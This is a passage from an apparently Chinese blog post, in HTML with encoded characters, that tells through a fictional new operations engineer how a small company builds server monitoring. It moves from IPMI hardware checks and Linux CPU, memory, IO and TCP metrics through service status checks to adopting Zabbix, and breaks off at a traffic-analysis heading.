x3002;</p>\n</li>\n<li><p>&#x786E;&#x5B9A;&#x62A5;&#x8B66;&#x57FA;&#x51C6;&#x7EBF;&#xFF1A;&#x600E;&#x4E48;&#x6837;&#x624D;&#x7B97;&#x662F;&#x6545;&#x969C;&#xFF0C;&#x8981;&#x62A5;&#x8B66;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;&#x8D1F;&#x8F7D;&#x5230;&#x5E95;&#x591A;&#x5C11;&#x7B97;&#x9AD8;&#xFF1F;</p>\n</li>\n</ul>\n<p>&#x5982;&#x679C;&#x4E0A;&#x8FF0;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x6EE1;&#x8DB3;&#xFF0C;&#x90A3;&#x5C31;&#x5148;&#x4E0D;&#x8981;&#x5F00;&#x59CB;&#x5B9E;&#x65BD;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x7B49;&#x505A;&#x5B8C;&#x4E86;&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x7136;&#x5E76;&#x5375;&#xFF1F;</p>\n<h3 id=\"2-&#x6545;&#x4E8B;&#x5F00;&#x59CB;\"><a href=\"#2-&#x6545;&#x4E8B;&#x5F00;&#x59CB;\" class=\"headerlink\" title=\"2. &#x6545;&#x4E8B;&#x5F00;&#x59CB;\"></a>2. &#x6545;&#x4E8B;&#x5F00;&#x59CB;</h3><p>&#x738B;&#x5C0F;&#x660E;&#xFF08;&#x5316;&#x540D;&#xFF09;&#x521A;&#x521A;&#x6BD5;&#x4E1A;&#xFF0C;&#x5230;&#x4E86;&#x4E00;&#x5BB6;&#x521A;&#x521A;&#x8D77;&#x6B65;&#x7684;&#x7535;&#x5546;&#x516C;&#x53F8;&#x4EFB;&#x804C;&#xFF1A;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x521A;&#x4E0A;&#x73ED;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x5C0F;&#x738B;&#x6536;&#x5230;&#x9886;&#x5BFC;&#x5B89;&#x6392;&#x7684;&#x5149;&#x8363;&#x4EFB;&#x52A1;:&#x628A;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x641E;&#x8D77;&#x6765;&#xFF01;</p>\n<p>&#x5C0F;&#x738B;&#x60F3;&#x4E86;&#x597D;&#x4E45;&#xFF0C;&#x6CA1;&#x60F3;&#x660E;&#x767D;&#xFF0C;&#x7D22;&#x6027;&#x4E0D;&#x60F3;&#x4E86;&#xFF0C;&#x4ECE;&#x624B;&#x5934;&#x63A5;&#x89E6;&#x5230;&#x7684;&#x6162;&#x6162;&#x5F00;&#x59CB;&#x5427;,&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51B3;&#x5B9A;&#x5148;&#x53BB;&#x673A;&#x623F;&#x770B;&#x770B;&#x3002;</p>\n<h4 id=\"2-1-&#x786C;&#x4EF6;&#x76D1;&#x63A7;\"><a href=\"#2-1-&#x786C;&#x4EF6;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.1 &#x786C;&#x4EF6;&#x76D1;&#x63A7;\"></a>2.1 &#x786C;&#x4EF6;&#x76D1;&#x63A7;</h4><p>&#x5230;&#x4E86;&#x673A;&#x623F;&#xFF0C;&#x5C0F;&#x738B;&#x770B;&#x7740;&#x516C;&#x53F8;&#x7684;&#x5404;&#x79CD;&#x54C1;&#x724C;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x60F3;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x60C5;&#x5C31;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#xFF0C;&#x6211;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x3002;</p>\n<p>&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x76D1;&#x63A7;&#x624B;&#x6BB5;&#xFF0C;&#x6BD4;&#x5982;&#x5B9A;&#x671F;&#x7684;&#x7684;&#x673A;&#x623F;&#x5DE1;&#x68C0;&#x3002;</p>\n<p>&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;&#x8FDC;&#x7A0B;&#x63A7;&#x5236;&#x5361;&#xFF0C;&#x5982;Dell&#x7684;iDRAC,HP&#x7684;ILO&#x548C;IBM&#x7684;IMM&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Web&#x754C;&#x9762;&#x6765;&#x8FDB;&#x884C;&#x786C;&#x4EF6;&#x7684;&#x76D1;&#x63A7;&#x548C;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x8D2D;&#x4E70;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x6388;&#x6743;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x53F0;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;</p>\n<p>&#x5728;Linux&#x4E0B;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x4F7F;&#x7528;IPMI&#x6765;&#x5B8C;&#x6210;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002;&#x901A;&#x5E38;&#x5FC5;&#x987B;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5C31;&#x662F;&#x6E29;&#x5EA6;&#x3001;&#x786C;&#x76D8;&#x6545;&#x969C;&#x7B49;&#x3002;</p>\n<p>&#x5C0F;&#x738B;&#x7F16;&#x5199;&#x4E86;&#x81EA;&#x5DF1;&#x804C;&#x4E1A;&#x751F;&#x6DAF;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x662F;&#x4F7F;&#x7528;ipmi&#x5DE5;&#x5177;&#x83B7;&#x53D6;&#x6E29;&#x5EA6;&#x4F20;&#x611F;&#x5668;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5927;&#x4E8E;50&#x5C31;&#x53D1;&#x4E00;&#x4EFD;&#x90AE;&#x4EF6;&#x7ED9;&#x4ED6;&#xFF0C;&#x867D;&#x7136;&#x611F;&#x89C9;&#x4E0D;&#x9AD8;&#x7AEF;&#xFF0C;&#x4F46;&#x603B;&#x7B97;&#x662F;&#x6709;&#x4E00;&#x4E2A;&#x5F00;&#x59CB;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p>&#x6545;&#x969C;&#x56DE;&#x60F3;&#xFF1A;&#x4E4B;&#x524D;&#x6211;&#x53F8;&#x6258;&#x7BA1;&#x5728;&#x5317;&#x4EAC;&#x67D0;&#x673A;&#x623F;&#x7684;&#x8BBE;&#x5907;&#x5C31;&#x51FA;&#x73B0;&#x8FC7;&#xFF0C;&#x56E0;&#x4E3A;&#x521A;&#x597D;&#x6240;&#x5728;&#x673A;&#x67DC;&#x533A;&#x57DF;&#x7684;&#x7A7A;&#x8C03;&#x574F;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#xFF0C;&#x7136;&#x540E;&#x7CFB;&#x7EDF;&#x5B95;&#x673A;&#x3002;</p>\n<h4 id=\"2-2-&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\"><a href=\"#2-2-&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.2 &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\"></a>2.2 &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x4E0B;&#x4E00;&#x4E2A;&#x60F3;&#x5230;&#x7684;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x516C;&#x53F8;&#x5168;&#x662F;Linux&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x80AF;&#x5B9A;&#x662F;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x7684;&#x3002;</p>\n<p>&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x4E3B;&#x8981;&#x7684;&#x5BF9;&#x8C61;&#x6709;&#xFF1A;</p>\n<p>1&#x3001;CPU<br>2&#x3001;Memory<br>3&#x3001;IO<br>4&#x3001;CPU&#xFF1A;&#x5173;&#x4E8E;CPU&#xFF0C;&#x6709;3&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6982;&#x5FF5;&#xFF1A;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#xFF08;context switchs&#xFF09;&#xFF0C;&#x8FD0;&#x884C;&#x961F;&#x5217;&#xFF08;Run queue&#xFF09;&#x548C;&#x4F7F;&#x7528;&#x7387;&#xFF08;utilization&#xFF09;&#x3002;</p>\n<p>&#x8FD9;&#x4E5F;&#x662F;&#x6211;&#x4EEC;CPU&#x76D1;&#x63A7;&#x7684;&#x4E09;&#x4E2A;&#x91CD;&#x70B9;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x961F;&#x5217;&#x8981;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;3&#xFF0C;CPU &#x5229;&#x7528;&#x7387;&#x4E2D;user/system&#x6BD4;&#x4F8B;&#x7EF4;&#x6301;&#x5728;70/30&#xFF0C;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#x8981;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;&#x6765;&#x7EFC;&#x5408;&#x8003;&#x91CF;&#x3002;</p>\n<p>&#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;top vmstat mpstat</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<p>&#x5185;&#x5B58;&#xFF1A;Linux&#x865A;&#x62DF;&#x5185;&#x5B58;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x4E1C;&#x4E1C;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x3001;SWAP&#x4F7F;&#x7528;&#x7387;&#x3001;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x66F2;&#x7EBF;&#x6765;&#x53D1;&#x73B0;&#x67D0;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x7B49;&#x3002;</p>\n<p>&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;free vmstat</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p>IO&#xFF1A;IO&#x5206;&#x4E3A;&#x78C1;&#x76D8;IO&#x548C;&#x7F51;&#x7EDC;IO&#x3002;&#x9664;&#x4E86;&#x5728;&#x505A;&#x6027;&#x80FD;&#x8C03;&#x4F18;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6570;&#x636E;&#x5916;&#xFF0C;&#x90A3;&#x4E48;&#x65E5;&#x5E38;&#x76D1;&#x63A7;&#xFF0C;&#x53EA;&#x5173;&#x6CE8;&#x78C1;&#x76D8;&#x4F7F;&#x7528;&#x7387;&#x3001;io wait&#x5373;&#x53EF;&#xFF0C;&#x7F51;&#x7EDC;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5373;&#x53EF;&#x3002;&#x5DE5;&#x5177;&#x6709;iostat iotop iftop&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>TCP&#x76D1;&#x63A7;&#xFF1A;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#x6709;&#x5FC5;&#x8981;&#x76D1;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;netstat&#x6216;&#x8005;ss&#x6765;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x7684;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x6765;&#x5C55;&#x73B0;11&#x79CD;&#x4E0D;&#x540C;&#x7684;TCP&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5927;&#x5E76;&#x53D1;&#x4E2D;&#x53CA;&#x65F6;&#x53D1;&#x73B0;TCP&#x7684;&#x76F8;&#x5173;&#x6545;&#x969C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<p>&#x5176;&#x5B83;&#x7684;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x8FD8;&#x6709;&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x767B;&#x9646;&#x7528;&#x6237;&#x3001;Open File&#x7B49;&#x3002;</p>\n<h4 id=\"2-3-&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\"><a href=\"#2-3-&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.3 &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\"></a>2.3 &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x628A;&#x786C;&#x4EF6;&#x76D1;&#x63A7;&#x548C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x7814;&#x7A76;&#x660E;&#x767D;&#x540E;&#xFF0C;&#x767B;&#x9646;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x5076;&#x7136;&#x95F4;&#x4E00;&#x4E2A;ps aux&#xFF0C;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD0;&#x884C;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x90FD;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x554A;&#x3002;</p>\n<p>&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x4E2D;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>\n<p>Apache&#xFF1A;Apache&#x63D0;&#x4F9B;&#x4E86;mod_status&#x548C;mod_info&#x6A21;&#x5757;&#x7528;&#x6765;&#x8F93;&#x51FA;Apache&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C0F;&#x738B;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5404;&#x79CD;grep&#x548C;awk&#x641E;&#x5B9A;&#x3002;<br>Nginx&#xFF1A;&#x540C;&#x6837;&#x6709;&#x72B6;&#x6001;&#x6A21;&#x5757;&#xFF0C;&#x7F16;&#x8BD1;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x2014;with-http_stub_status_module&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;stub_status on&#x6765;&#x5F00;&#x542F;&#x4E86;&#x3002;<br>Memcached&#xFF1A;&#x5C0F;&#x738B;&#x4F7F;&#x7528;nc&#x7ED9;memcached&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;stats&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;&#x6240;&#x6709;&#x60F3;&#x8981;&#x7684;&#x4FE1;&#x606F;&#x3002;<br>Redis&#xFF1A;&#x5C0F;&#x738B;&#x8FD8;&#x662F;&#x4F7F;&#x7528;nc&#x7ED9;redis&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;info&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;redis&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002;<br>JVM&#xFF1A;&#x4F7F;&#x7528;jmconsole&#xFF0C;&#x6216;&#x8005;jmx&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x76D1;&#x63A7;&#x3002;<br>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#xFF0C;&#x5C06;&#x7EBF;&#x4E0A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#xFF0C;&#x90FD;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x7684;&#x8FDB;&#x884C;&#x4E86;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x8BE6;&#x7EC6;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x5C31;&#x4E86;&#x5982;&#x6307;&#x638C;&#x4E86;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x5C06;&#x6240;&#x6709;&#x7684;API&#x63A5;&#x53E3;&#x72B6;&#x6001;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x6BD4;&#x5982;&#x901A;&#x8FC7;curl&#x68C0;&#x67E5;&#x8FD4;&#x56DE;&#x7684;HTTP&#x72B6;&#x6001;&#x7801;&#x3002;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;URL&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x505A;&#x8FD9;&#x4E2A;&#x4E8B;&#x60C5;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/7.png\" alt=\"&#x56FE;&#x7247;7\"></p>\n<h4 id=\"2-4-&#x5F15;&#x5165;Zabbix\"><a href=\"#2-4-&#x5F15;&#x5165;Zabbix\" class=\"headerlink\" title=\"2.4 &#x5F15;&#x5165;Zabbix\"></a>2.4 &#x5F15;&#x5165;Zabbix</h4><p>&#x81EA;&#x4ECE;&#x5C0F;&#x738B;&#x63A5;&#x6536;&#x5230;&#x76D1;&#x63A7;&#x7684;&#x4EFB;&#x52A1;&#x540E;&#xFF0C;&#x8FD9;Shell&#x7F16;&#x7A0B;&#x80FD;&#x529B;&#x662F;&#x8D8A;&#x6765;&#x8D8A;&#x5F3A;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x5929;&#x4E00;&#x6253;&#x5F00;&#x90AE;&#x7BB1;&#x5C31;&#x88AB;&#x5404;&#x79CD;&#x62A5;&#x8B66;&#x6240;&#x6DF9;&#x6CA1;&#xFF0C;&#x811A;&#x672C;&#x591A;&#x800C;&#x6742;&#x4E71;&#x3002;</p>\n<p>&#x5C0F;&#x738B;&#x60F3;&#xFF0C;&#x6211;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6765;&#x5E72;&#x8FD9;&#x4E9B;&#x4E8B;&#xFF0C;&#x4E0D;&#x80FD;&#x8FD9;&#x4E48;&#x5199;&#x811A;&#x672C;&#x4E0B;&#x53BB;&#x4E86;&#x3002;&#x4E8E;&#x662F;&#x5728;&#x7F51;&#x4E0A;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x641C;&#x7D22;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x5982;Nagios&#x3001;Cacti&#x3001;Zabbix&#xFF0C;&#x539F;&#x6765;&#x81EA;&#x5DF1;&#x4E4B;&#x524D;&#x8D39;&#x90A3;&#x4E48;&#x5927;&#x52B2;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65E9;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x3002;</p>\n<p>&#x7ECF;&#x8FC7;&#x76F8;&#x5173;&#x7684;&#x5BF9;&#x6BD4;&#xFF0C;&#x5C0F;&#x738B;&#x9009;&#x62E9;&#x4E86;Zabbix&#x3002;&#x7136;&#x540E;&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x76D1;&#x63A7;&#x8303;&#x7574;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x6574;&#x5408;&#x5230;Zabbix&#x4E2D;&#x3002;</p>\n<p>&#x786C;&#x4EF6;&#x76D1;&#x63A7;&#xFF1A;Zabbix IPMI Interface<br>&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent Interface<br>Java&#x76D1;&#x63A7;&#xFF1A;Zabbix JMX Interface<br>&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#xFF1A;Zabbix SNMP Interface<br>&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent UserParameter<br>MySQL&#x6570;&#x636E;&#x5E93;&#x76D1;&#x63A7;&#xFF1A;percona-monitoring-plulgins<br>URL&#x76D1;&#x63A7;&#xFF1A;Zabbix Web &#x76D1;&#x63A7;  </p>\n<p>&#x8FD9;&#x4E00;&#x4E0B;&#x5B50;&#x628A;&#x4E4B;&#x524D;&#x5E72;&#x7684;&#x5DE5;&#x4F5C;&#x5168;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x4E2A;&#x5E73;&#x53F0;&#x4E0A;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x4E4B;&#x524D;&#x7F16;&#x5199;&#x7684;&#x6240;&#x6709;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x7684;&#x76D1;&#x63A7;&#x811A;&#x672C;&#xFF0C;&#x7B80;&#x5355;&#x4FEE;&#x6539;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x7075;&#x6D3B;&#x7684;&#x8BBE;&#x7F6E;&#x62A5;&#x8B66;&#x9608;&#x503C;&#x3001;&#x544A;&#x8B66;&#x65B9;&#x5F0F;&#x3001;&#x544A;&#x8B66;&#x5347;&#x7EA7;&#x3001;&#x544A;&#x8B66;&#x53BB;&#x91CD;&#x3001;&#x544A;&#x8B66;&#x4F9D;&#x8D56;&#x7B49;&#x7B49;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#x529F;&#x80FD;&#x5B9E;&#x73B0;&#x4E0A;&#x7EBF;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540E;&#xFF0C;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x4F7F;&#x7528;Zabbix Proxy&#x5B9E;&#x73B0;&#x4E86;&#x591A;&#x673A;&#x623F;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x7B80;&#x76F4;&#x592A;&#x68D2;&#x4E86;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x544A;&#x8B66;&#x901A;&#x77E5;&#xFF1A;&#x90AE;&#x4EF6;&#x3001;&#x5FAE;&#x4FE1;&#x3001;&#x77ED;&#x4FE1;&#x3001;&#x9489;&#x9489;&#x7B49;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x4E0E;Zabbix&#x5FEB;&#x901F;&#x7684;&#x96C6;&#x6210;&#xFF0C;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6B64;&#x7C7B;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x9488;&#x5BF9;&#x67D0;&#x4E9B;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x5904;&#x7406;&#x7684;&#x62A5;&#x8B66;&#xFF0C;Zabbix&#x53EF;&#x4EE5;&#x89E6;&#x53D1;Action&#x6765;&#x8F7B;&#x677E;&#x5E2E;&#x4F60;&#x5B9E;&#x73B0;&#xFF0C;&#x6545;&#x969C;&#x7684;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51C6;&#x5907;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x5DE5;&#x4F5C;&#xFF0C;&#x6B64;&#x5904;&#x7701;&#x7565;300&#x5B57;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5230;10&#x5206;&#x949F;&#x5C0F;&#x738B;&#x5782;&#x76F4;&#x5934;&#x56DE;&#x6765;&#x4E86;&#x3002;&#x56E0;&#x4E3A;&#x7ECF;&#x7406;&#x95EE;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C0F;&#x738B;&#x56DE;&#x7B54;&#x4E0D;&#x4E0A;&#x6765;&#xFF1A;&#x5C0F;&#x738B;&#xFF0C;&#x4ECA;&#x5929;&#x54B1;&#x4EEC;&#x7F51;&#x7AD9;&#x7684;&#x6574;&#x4F53;PV&#x662F;&#x591A;&#x5C11;&#xFF1F;&#x73B0;&#x5728;&#x8BBF;&#x95EE;&#x6700;&#x591A;&#x7684;&#x9875;&#x9762;&#x662F;&#x54EA;&#x4E2A;&#xFF1F;</p>\n<h4 id=\"2-5-&#x6D41;&#x91CF;&#x5206;&#x6790;\"><a href=\"#2-5-&#x6D41;&#x91CF;&#x5206;&#x6790;\" class=\"headerlink\" title=\"2.5 &#x6D41;&#x91CF;&#x5206;&#x6790;\"></a>2.5 